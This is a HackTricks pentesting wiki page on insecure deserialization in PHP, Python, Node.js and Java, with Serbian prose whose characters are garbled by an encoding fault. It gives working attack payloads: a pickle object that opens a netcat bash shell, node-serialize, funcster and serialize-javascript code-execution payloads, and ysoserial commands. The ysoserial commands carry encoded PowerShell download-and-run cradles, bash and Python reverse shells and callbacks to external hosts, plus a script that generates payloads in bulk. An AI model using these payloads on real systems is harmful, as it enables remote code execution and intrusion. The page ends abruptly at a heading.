# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Serijalizacija** se razume kao metoda konvertovanja objekta u format koji moÅ¾e biti saÄuvan, sa namerom da se objekat ili saÄuva ili prenese kao deo komunikacionog procesa. Ova tehnika se obiÄno koristi da se osigura da objekat moÅ¾e biti ponovo kreiran u buduÄ‡nosti, zadrÅ¾avajuÄ‡i svoju strukturu i stanje.

**Deserijalizacija**, s druge strane, je proces koji deluje protiv serijalizacije. UkljuÄuje uzimanje podataka koji su strukturirani u specifiÄnom formatu i rekonstrukciju nazad u objekat.

Deserijalizacija moÅ¾e biti opasna jer potencijalno **omoguÄ‡ava napadaÄima da manipuliÅ¡u serijalizovanim podacima kako bi izvrÅ¡ili Å¡tetan kod** ili izazvali neoÄekivano ponaÅ¡anje u aplikaciji tokom procesa rekonstrukcije objekta.

## PHP

U PHP-u, specifiÄne magiÄne metode se koriste tokom procesa serijalizacije i deserijalizacije:

* `__sleep`: Poziva se kada se objekat serijalizuje. Ova metoda treba da vrati niz imena svih svojstava objekta koja treba serijalizovati. ObiÄno se koristi za obaveÅ¡tavanje o Äekanju podataka ili obavljanje sliÄnih zadataka ÄiÅ¡Ä‡enja.
* `__wakeup`: Poziva se kada se objekat deserijalizuje. Koristi se za ponovnu uspostavu bilo kakvih veza sa bazom podataka koje su moÅ¾da izgubljene tokom serijalizacije i obavljanje drugih zadataka ponovne inicijalizacije.
* `__unserialize`: Ova metoda se poziva umesto `__wakeup` (ako postoji) kada se objekat deserijalizuje. Daje viÅ¡e kontrole nad procesom deserijalizacije u poreÄ‘enju sa `__wakeup`.
* `__destruct`: Ova metoda se poziva kada se objekat sprema da bude uniÅ¡ten ili kada skript zavrÅ¡i. ObiÄno se koristi za zadatke ÄiÅ¡Ä‡enja, kao Å¡to su zatvaranje datoteÄnih rukova ili veza sa bazom podataka.
* `__toString`: Ova metoda omoguÄ‡ava da se objekat tretira kao string. MoÅ¾e se koristiti za Äitanje datoteke ili druge zadatke zasnovane na pozivima funkcija unutar njega, efikasno pruÅ¾ajuÄ‡i tekstualnu reprezentaciju objekta.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Ako pogledate rezultate, moÅ¾ete videti da se funkcije **`__wakeup`** i **`__destruct`** pozivaju kada se objekat deserializuje. Imajte na umu da u nekoliko tutorijala moÅ¾ete pronaÄ‡i da se funkcija **`__toString`** poziva kada pokuÅ¡avate da odÅ¡tampate neku atribut, ali oÄigledno to **viÅ¡e ne deÅ¡ava**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** se poziva **umesto `__wakeup()`** ako je implementirana u klasi. OmoguÄ‡ava vam da deserializujete objekat pruÅ¾ajuÄ‡i serijalizovane podatke kao niz. MoÅ¾ete koristiti ovu metodu za deserializaciju svojstava i izvrÅ¡avanje svih potrebnih zadataka prilikom deserializacije.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

MoÅ¾ete proÄitati objaÅ¡njeni **PHP primer ovde**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ovde [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ili ovde [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Klase

MoÅ¾ete zloupotrebiti PHP autoload funkcionalnost da uÄitate proizvoljne php datoteke i joÅ¡ viÅ¡e:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serijalizacija Referenciranih Vrednosti

Ako iz nekog razloga Å¾elite da serijalizujete vrednost kao **referencu na drugu serijalizovanu vrednost** moÅ¾ete:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) moÅ¾e vam pomoÄ‡i da generiÅ¡ete payload-ove za zloupotrebu PHP deseralizacija.\
Imajte na umu da u nekoliko sluÄajeva **neÄ‡ete moÄ‡i da pronaÄ‘ete naÄin da zloupotrebite deseralizaciju u izvor kodu** aplikacije, ali moÅ¾da Ä‡ete moÄ‡i da **zloupotrebite kod eksternih PHP ekstenzija.**\
Dakle, ako moÅ¾ete, proverite `phpinfo()` servera i **pretraÅ¾ujte internet** (Äak i na **gadgets** od **PHPGGC**) za neke moguÄ‡e gadgete koje biste mogli zloupotrebiti.

### phar:// metadata deserialization

Ako ste pronaÅ¡li LFI koji samo Äita datoteku i ne izvrÅ¡ava php kod unutar nje, na primer koristeÄ‡i funkcije kao Å¡to su _**file\_get\_contents(), fopen(), file() ili file\_exists(), md5\_file(), filemtime() ili filesize()**_**.** MoÅ¾ete pokuÅ¡ati da zloupotrebite **deseralizaciju** koja se deÅ¡ava prilikom **Äitavanja** **datoteke** koristeÄ‡i **phar** protokol.\
Za viÅ¡e informacija proÄitajte sledeÄ‡i post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Kada se objekat unpickle, funkcija _\_\_reduce\_\__ Ä‡e biti izvrÅ¡ena.\
Kada se iskoristi, server moÅ¾e vratiti greÅ¡ku.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Pre nego Å¡to proverite tehniku za zaobilaÅ¾enje, pokuÅ¡ajte da koristite `print(base64.b64encode(pickle.dumps(P(),2)))` da generiÅ¡ete objekat koji je kompatibilan sa python2 ako koristite python3.

Za viÅ¡e informacija o izlasku iz **pickle jails** proverite:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

SledeÄ‡a stranica predstavlja tehniku za **zloupotrebu nesigurne deserializacije u yaml** python bibliotekama i zavrÅ¡ava alatom koji se moÅ¾e koristiti za generisanje RCE deserializacijskih payload-a za **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **nema "magic" funkcije** kao PHP ili Python koje Ä‡e biti izvrÅ¡ene samo za kreiranje objekta. Ali ima neke **funkcije** koje se **Äesto koriste Äak i bez direktnog pozivanja** kao Å¡to su **`toString`**, **`valueOf`**, **`toJSON`**.\
Ako zloupotrebljavate deserializaciju, moÅ¾ete **kompromitovati ove funkcije da izvrÅ¡ite drugi kod** (potencijalno zloupotrebljavajuÄ‡i prototipske zagaÄ‘enja) i mogli biste izvrÅ¡iti proizvoljan kod kada se pozovu.

Drugi **"magic" naÄin da pozovete funkciju** bez direktnog pozivanja je **kompromitovanjem objekta koji se vraÄ‡a iz async funkcije** (promise). Jer, ako **transformiÅ¡ete** taj **vraÄ‡eni objekat** u drugu **promise** sa **svojstvom** pod nazivom **"then" tipa funkcija**, biÄ‡e **izvrÅ¡ena** samo zato Å¡to je vraÄ‡ena iz druge promise. _Pratite_ [_**ovu vezu**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _za viÅ¡e informacija._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` i `prototype` zagaÄ‘enje

Ako Å¾elite da saznate viÅ¡e o ovoj tehnici **pogledajte sledeÄ‡i tutorijal**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ova biblioteka omoguÄ‡ava serijalizaciju funkcija. Primer:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**Serijalizovani objekat** Ä‡e izgledati ovako:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
MoÅ¾ete videti u primeru da kada je funkcija serijalizovana, `_$$ND_FUNC$$_` oznaka se dodaje serijalizovanom objektu.

Unutar datoteke `node-serialize/lib/serialize.js` moÅ¾ete pronaÄ‡i istu oznaku i kako se kod koristi.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Kao Å¡to moÅ¾ete videti u poslednjem delu koda, **ako je oznaka pronaÄ‘ena** `eval` se koristi za deserializaciju funkcije, tako da se u suÅ¡tini **korisniÄki unos koristi unutar `eval` funkcije**.

MeÄ‘utim, **samo serijalizovanje** funkcije **neÄ‡e je izvrÅ¡iti** jer bi bilo potrebno da neki deo koda **poziva `y.rce`** u naÅ¡em primeru i to je veoma **neprikladno**.\
U svakom sluÄaju, mogli biste samo **modifikovati serijalizovani objekat** **dodajuÄ‡i neke zagrade** kako biste automatski izvrÅ¡ili serijalizovanu funkciju kada se objekat deserializuje.\
U sledeÄ‡em delu koda **obratite paÅ¾nju na poslednju zagradu** i kako Ä‡e `unserialize` funkcija automatski izvrÅ¡iti kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Kao Å¡to je prethodno navedeno, ova biblioteka Ä‡e dobiti kod nakon `_$$ND_FUNC$$_` i Ä‡e **izvrÅ¡iti** ga koristeÄ‡i `eval`. Stoga, da biste **automatski izvrÅ¡ili kod**, moÅ¾ete **izbrisati deo za kreiranje funkcije** i poslednju zagradu i **samo izvrÅ¡iti JS oneliner** kao u sledeÄ‡em primeru:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
MoÅ¾ete [**pronaÄ‡i ovde**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dodatne informacije** o tome kako iskoristiti ovu ranjivost.

### [funcster](https://www.npmjs.com/package/funcster)

ZnaÄajan aspekt **funcster** je nedostupnost **standardnih ugraÄ‘enih objekata**; oni su van dostupnog opsega. Ova ograniÄenja spreÄavaju izvrÅ¡avanje koda koji pokuÅ¡ava da pozove metode na ugraÄ‘enim objektima, Å¡to dovodi do izuzetaka kao Å¡to su `"ReferenceError: console is not defined"` kada se koriste komande poput `console.log()` ili `require(something)`.

Uprkos ovom ograniÄenju, obnova potpunog pristupa globalnom kontekstu, ukljuÄujuÄ‡i sve standardne ugraÄ‘ene objekte, moguÄ‡a je kroz specifiÄan pristup. KoriÅ¡Ä‡enjem globalnog konteksta direktno, moÅ¾e se zaobiÄ‡i ovo ograniÄenje. Na primer, pristup se moÅ¾e ponovo uspostaviti koristeÄ‡i sledeÄ‡i isjeÄak:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Za**[ **viÅ¡e informacija proÄitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Paket **serialize-javascript** je dizajniran iskljuÄivo za svrhe serijalizacije, bez ugraÄ‘enih moguÄ‡nosti deserializacije. Korisnici su odgovorni za implementaciju svoje metode za deserializaciju. Direktna upotreba `eval` se sugeriÅ¡e u zvaniÄnom primeru za deserializaciju serijalizovanih podataka:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Ako se ova funkcija koristi za deserializaciju objekata, moÅ¾ete je **lako iskoristiti**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Za**[ **viÅ¡e informacija proÄitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo biblioteka

Na sledeÄ‡im stranicama moÅ¾ete pronaÄ‡i informacije o tome kako zloupotrebiti ovu biblioteku za izvrÅ¡avanje proizvoljnih komandi:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

U Javi, **deserializacijski povratni pozivi se izvrÅ¡avaju tokom procesa deserializacije**. Ova izvrÅ¡enja mogu biti iskoriÅ¡Ä‡ena od strane napadaÄa koji kreiraju zlonamerne terete koje aktiviraju ove povratne pozive, Å¡to moÅ¾e dovesti do potencijalnog izvrÅ¡enja Å¡tetnih radnji.

### Otisci

#### Bela kutija

Da biste identifikovali potencijalne ranjivosti serijalizacije u kodu, traÅ¾ite:

* Klase koje implementiraju `Serializable` interfejs.
* KoriÅ¡Ä‡enje `java.io.ObjectInputStream`, `readObject`, `readUnshare` funkcija.

Obratite posebnu paÅ¾nju na:

* `XMLDecoder` koriÅ¡Ä‡en sa parametrima koje definiÅ¡u spoljski korisnici.
* `XStream`'s `fromXML` metoda, posebno ako je verzija XStream manja ili jednaka 1.46, jer je podloÅ¾na problemima sa serijalizacijom.
* `ObjectInputStream` u kombinaciji sa `readObject` metodom.
* Implementaciju metoda kao Å¡to su `readObject`, `readObjectNodData`, `readResolve`, ili `readExternal`.
* `ObjectInputStream.readUnshared`.
* OpÅ¡tu upotrebu `Serializable`.

#### Crna kutija

Za testiranje crne kutije, traÅ¾ite specifiÄne **potpise ili "Magic Bytes"** koji oznaÄavaju java serijalizovane objekte (proizlazeÄ‡i iz `ObjectInputStream`):

* Hexadecimalni obrazac: `AC ED 00 05`.
* Base64 obrazac: `rO0`.
* HTTP odgovarajuÄ‡i zaglavlja sa `Content-type` postavljenim na `application/x-java-serialized-object`.
* Hexadecimalni obrazac koji oznaÄava prethodnu kompresiju: `1F 8B 08 00`.
* Base64 obrazac koji oznaÄava prethodnu kompresiju: `H4sIA`.
* Web datoteke sa ekstenzijom `.faces` i parametrom `faces.ViewState`. OtkriÄ‡e ovih obrazaca u web aplikaciji treba da podstakne ispitivanje kao Å¡to je detaljno opisano u [postu o Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Proverite da li je ranjiv

Ako Å¾elite da **nauÄite kako funkcioniÅ¡e Java Deserialized exploit** trebali biste pogledati [**Osnovna Java Deserializacija**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserializacija**](java-dns-deserialization-and-gadgetprobe.md), i [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### White Box Test

MoÅ¾ete proveriti da li je instalirana neka aplikacija sa poznatim ranjivostima.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
MoÅ¾ete pokuÅ¡ati da **proverite sve biblioteke** za koje je poznato da su ranjive i za koje [**Ysoserial**](https://github.com/frohoff/ysoserial) moÅ¾e da pruÅ¾i eksploataciju. Ili moÅ¾ete proveriti biblioteke navedene na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
TakoÄ‘e moÅ¾ete koristiti [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) da traÅ¾ite moguÄ‡e lance gadgeta koji se mogu iskoristiti.\
Kada pokreÄ‡ete **gadgetinspector** (nakon Å¡to ga izgradite), ne obraÄ‡ajte paÅ¾nju na mnoÅ¡tvo upozorenja/greÅ¡aka kroz koje prolazi i pustite ga da zavrÅ¡i. ZapiÅ¡aÄ‡e sve nalaze pod _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Molimo vas, primetite da **gadgetinspector neÄ‡e kreirati eksploataciju i moÅ¾e ukazivati na laÅ¾ne pozitivne rezultate**.

#### Black Box Test

KoriÅ¡Ä‡enjem Burp ekstenzije [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) moÅ¾ete identifikovati **koje biblioteke su dostupne** (pa Äak i verzije). Sa ovom informacijom bi moglo biti **lakÅ¡e odabrati payload** za eksploataciju ranjivosti.\
[**ProÄitajte ovo da biste saznali viÅ¡e o GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe je fokusiran na **`ObjectInputStream` deserializacije**.

KoriÅ¡Ä‡enjem Burp ekstenzije [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) moÅ¾ete **identifikovati ranjive biblioteke** koje se mogu eksploatisati sa ysoserial i **iskoristiti** ih.\
[**ProÄitajte ovo da biste saznali viÅ¡e o Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner je fokusiran na **`ObjectInputStream`** deserializacije.

TakoÄ‘e moÅ¾ete koristiti [**Freddy**](https://github.com/nccgroup/freddy) da **otkrijete deserializacione** ranjivosti u **Burp**. Ovaj dodatak Ä‡e otkriti **ne samo `ObjectInputStream`** povezane ranjivosti, veÄ‡ **takoÄ‘e** ranjivosti iz **Json** i **Yml** deserializacionih biblioteka. U aktivnom reÅ¾imu, pokuÅ¡aÄ‡e da ih potvrdi koristeÄ‡i sleep ili DNS payloads.\
[**ViÅ¡e informacija o Freddyu moÅ¾ete pronaÄ‡i ovde.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Nije sve u proveri da li server koristi neku ranjivu biblioteku. Ponekad biste mogli biti u moguÄ‡nosti da **promenite podatke unutar serijalizovanog objekta i zaobiÄ‘ete neke provere** (moÅ¾da vam dodeli administratorske privilegije unutar web aplikacije).\
Ako pronaÄ‘ete java serijalizovani objekat koji se Å¡alje u web aplikaciju, **moÅ¾ete koristiti** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **da odÅ¡tampate u Äitljivijem formatu serijalizovani objekat koji se Å¡alje**. ZnajuÄ‡i koje podatke Å¡aljete, biÄ‡e lakÅ¡e izmeniti ih i zaobiÄ‡i neke provere.

### **Exploit**

#### **ysoserial**

Glavni alat za eksploataciju Java deserializacija je [**ysoserial**](https://github.com/frohoff/ysoserial) ([**preuzmite ovde**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). TakoÄ‘e moÅ¾ete razmotriti koriÅ¡Ä‡enje [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) koji Ä‡e vam omoguÄ‡iti da koristite sloÅ¾ene komande (na primer, sa cevima).\
Napomena: ovaj alat je **fokusiran** na eksploataciju **`ObjectInputStream`**.\
PreporuÄujem da **poÄnete sa "URLDNS"** payloadom **pre RCE** payloada da testirate da li je injekcija moguÄ‡a. U svakom sluÄaju, imajte na umu da moÅ¾da "URLDNS" payload ne radi, ali drugi RCE payload moÅ¾e.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Kada kreirate payload za **java.lang.Runtime.exec()** ne **moÅ¾ete koristiti specijalne karaktere** kao Å¡to su ">" ili "|" za preusmeravanje izlaza izvrÅ¡enja, "$()" za izvrÅ¡avanje komandi ili Äak **proslediti argumente** komandi odvojene **razmacima** (moÅ¾ete uraditi `echo -n "hello world"` ali ne moÅ¾ete uraditi `python2 -c 'print "Hello world"'`). Da biste ispravno kodirali payload, moÅ¾ete [koristiti ovu veb stranicu](http://www.jackson-t.ca/runtime-exec-payloads.html).

Slobodno koristite sledeÄ‡i skript za kreiranje **svi moguÄ‡ih payload-a za izvrÅ¡enje koda** za Windows i Linux, a zatim ih testirajte na ranjivoj veb stranici:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

MoÅ¾ete **koristiti** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **zajedno sa ysoserial da kreirate viÅ¡e eksploita**. ViÅ¡e informacija o ovom alatu moÅ¾ete pronaÄ‡i u **prezentacijama sa predavanja** gde je alat predstavljen: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

